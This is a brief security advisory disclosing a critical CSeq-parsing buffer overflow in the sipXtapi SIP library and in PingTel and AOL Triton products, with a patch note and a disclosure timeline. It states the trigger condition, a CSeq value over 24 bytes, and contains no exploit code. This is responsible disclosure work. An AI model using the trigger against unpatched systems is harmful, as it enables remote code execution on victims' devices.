Homepage: www.ernw.de

1. Summary:
The sipXtapi library from sip foundry contains a buffer overflow when parsing the CSeq field.
This flaw can be used by  an attacker to gain control over EIP and execute arbitrary code.

2. Severity : Critical

3. Products affected
- sipXtapi: all version compiled before 24 of march 2006
- PingTel products
- AOL Triton

4. Patch Availability :
A patch is available within the source tree and the affected products of PingTel and AOL
have beed updated.

5. Details
Sending a CSeq field value greater than 24 bytes triggers the buffer ovlerflow condition.

6. Solution
Update the affected products to the actual version.

7. Time-Line 
20 Mar 2006: Vulnerability reported to vendor
20 Mar 2006: Answer from vendor
24 Mar 2006: Patch available
10 July 2006: Public Disclosure
